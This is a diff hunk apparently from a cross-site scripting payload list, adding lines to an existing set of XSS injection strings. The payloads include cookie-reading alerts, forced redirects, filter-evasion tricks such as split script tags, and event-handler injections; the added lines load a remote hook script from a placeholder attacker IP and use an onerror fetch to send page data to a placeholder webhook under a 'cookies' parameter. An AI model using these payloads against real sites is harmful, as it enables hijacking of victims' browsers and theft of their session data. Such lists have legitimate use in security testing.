@@ -8,8 +8,12 @@
 <script>alert(document.cookie)</script>
 <script>document.location="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley"</script>
 \<a onerror="alert(document.cookie)"\>xxs link\</a\>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
 <sc<script>ript>alert(1)</script>
 </select><img src='x' onerror='document.location="https://www.google.com/"'>
+<script src="http://<IP ADDR>:3500/hook.js"></script>
+<img src="/" onerror="fetch(`<WEBHOOK>?cookies=${document.location}`)">
+<img src=”<LINK_IMAGE >”>
 "onclick=prompt(8)>"@x.y
 "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 <image/src/onerror=prompt(8)>
